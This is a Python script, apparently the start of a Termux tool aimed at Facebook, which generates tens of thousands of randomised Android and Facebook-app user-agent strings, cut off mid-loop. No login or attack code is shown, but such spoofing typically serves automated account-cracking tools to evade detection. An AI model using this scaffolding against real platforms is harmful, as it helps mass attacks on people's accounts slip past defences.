# OWNER BY SCRIPT : MR PAPI
# GITHUB LINK : PAPI-777
# MACK BY : MR PAPI 
#__________________| FULL SCRIPT |__________________# 
#▬▭▬▭▬▭▬▭[ IMPORT MODULES ]▬▭▬▭▬▭▬▭#
import os
os.system("pkg install espeak")
import os,time,sys,re,string,uuid,json,random
from concurrent.futures import ThreadPoolExecutor as threadpol
from os import system as magi
#__________NEW IDX UA_____________#
def S1():
	model2 = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
	model1 = random.choice(['X676B','X687','X609','X697','X680D','X507','X605','X668','X6815B','X624','X655F','X689C','X608','X698','X682B','X682C','X688C','X688B','X658E','X659B','X689B','X689','X689D','X662','X662B','X675','X6816C','X6817','X6817B','X6812','X6812B','X559F','X559C','X559','X606','X6816D','X6816','X668C','X665B','X665E','X510','X606C','X606D','X623','X624B','X625C','X625D','X625B','X650D','X650B','X650','X650C','X655C','X655D','X680B','X573','X573B','X622','X693','X695C','X695D','X695','X663B','X663','X670','X671','X671B','X672','X6819','X572-LTE','X572','X571','X604','X610B','X690','X690B','X656','X692','X683','X450','X5010','X501','X401','X626','X626B','X652','X652A','X652B','X652C','X660B','X660C','X660','X5515','X5515F','X5515I','X609B','X5514D','X5516B','X5516C','X627','X680','X653','X653C','X657','X657B','X657C','X6511B','X6511','X6511E','X6512','X6823C','X612B','X612','X503','X511','X352','X351','X530','X676C','X6821','X6823','X6827','X509','X603','X6815','X620B','X620','X687B','X6811B','X6810','X6811','X6528'])
	en = random.choice(['en_US','en_GB','en_PK','ru_RU','de_DE','th_TH','en_BD','en_IN','en_AF'])
	kt = random.choice(['com.facebook.katana','com.facebook.orca','com.facebook.mlite'])
	fbcr = random.choice(['o2 - de', 'Verizon - us','MY CELCOM','Vodafone - uk','null','DTAC','IND airtel','Nepal Telecom','Robi','Banglalink','Grameenphone','Airtel'])
	s= "[FBAN/FB4A;FBAV/"+str(random.randint(111,999))+'.0.0.'+str(random.randrange(9,99))+str(random.randint(111,999)) +";FBBV/"+str(random.randint(111111111,999999999))
	e = ";Mozilla/5.0 (Linux; U; Android{random.randint(4,13)}; {random.choice(model2)} Build/PPR1.{random.randint(111111,999999)}.{random.randint(111,999)}))[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_IN;FBRV/0;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A205F;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]"
	ua = s + e	
	return ua
#▬▭▬▭▬▭▬▭[ RANDOM UA ]▬▭▬▭▬▭▬▭#
ugen=[]
for sat in range(1000):
	a='Realme'
	b=random.randrange(1,9)
	c='-0'
	d=random.randrange(1,9)
	e='/'
	f=random.randrange(1,9)
	g='.0 ('
	h=random.randrange(1,12)
	i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
	j='UNTRUSTED/'
	k=random.randrange(1,3)
	l='.0'
	uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
	ugen.append(uaku2)
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
for xd in range(10000):
        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c=f' TL-tl; {str(gt)}'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)
gs = random.choice(['X676B','X687','X609','X697','X680D','X507','X605','X668','X6815B','X624','X655F','X689C','X608','X698','X682B','X682C','X688C','X688B','X658E','X659B','X689B','X689','X689D','X662','X662B','X675','X6816C','X6817','X6817B','X6812','X6812B','X559F','X559C','X559','X606','X6816D','X6816','X668C','X665B','X665E','X510','X606C','X606D','X623','X624B','X625C','X625D','X625B','X650D','X650B','X650','X650C','X655C','X655D','X680B','X573','X573B','X622','X693','X695C','X695D','X695','X663B','X663','X670','X671','X671B','X672','X6819','X572-LTE','X572','X571','X604','X610B','X690','X690B','X656','X692','X683','X450','X5010','X501','X401','X626','X626B','X652','X652A','X652B','X652C','X660B','X660C','X660','X5515','X5515F','X5515I','X609B','X5514D','X5516B','X5516C','X627','X680','X653','X653C','X657','X657B','X657C','X6511B','X6511','X6511E','X6512','X6823C','X612B','X612','X503','X511','X352','X351','X530','X676C','X6821','X6823','X6827','X509','X603','X6815','X620B','X620','X687B','X6811B','X6810','X6811','X6528'])
for xd in range(10000):
        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['6','7','8','9','10','11','12','13','14'])
        c=f' TL-tl; {str(gs)}'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
for xd in range(1000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
for ix in range(5000):
    a="Mozilla/5.0 (Linux; Android "
    b=random.choice(["12;","13;"])
    c=" Nokia C"
    d=str(random.randint(10,110))
    e=" Build/"
    f=random.choice(["SP1A.","TP1A."])
    g=str(random.randint(210812,220624))
    h=".0"
    i=str(random.randint(14,16))
    j="; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"
    k=str(random.randint(108,118))
    l=".0."
    m=str(random.randint(1,5359))
    n="."
    o=str(random.randint(1,128))
    p=" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/439.0.0.44.117;]"
    useragent=a+b+c+d+e+f+g+h+i+j+k+l+m+n+o+p   
    ugen.append(useragent)
for snigdho in range(5000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,199)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
for xd in range(10000):
        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c=f' TL-tl; {str(gt)}'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,199)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)
for snigdho in range(10000):
    aa='Mozilla/5.0 (Linux; Android 10;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 777)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,100)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for snigdho in range(5000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
for ua in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c='Pixel 6 Build/SD1A.210817.023; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(92,115)
	e='0'
	f=random.randrange(4200,6000)
	g=random.randrange(62,199)
	h='Mobile Safari/537.36'
	lol=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(lol)
for ua in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c=random.choice(['SM-A205U','SM-A102U','SM-G960U','SM-N960U','LM-Q720','LM-X420','LM-Q710(FGN)'])
	d=') AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(92,115)
	x='0'
	f=random.randrange(4200,6000)
	g=random.randrange(62,199)
	h='Mobile Safari/537.36'
	lol=f'{a} {b}; {c}{d}{e}.{x}.{f}.{g} {h}'
	ugen.append(lol)
for ua in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['4','5','6','7','8','9','10','11'])
	c='MiTV-AESP0 Build/PI; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(62,115)
	e='0'
	f=random.randrange(3200,5900)
	g=random.randrange(92,199)
	h='Mobile Safari/537.36'
	lol=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(lol)
for ua in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['4','5','6','7','8','9','10','11'])
	x='0'
	c='ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(62,115)
	e='0'
	f=random.randrange(3200,5900)
	g=random.randrange(92,199)
	h='Mobile Safari/537.36'
	lol=f'{a} {b}.{x}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(lol)
for ua in range(10000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['9','10','11','12','13','14'])
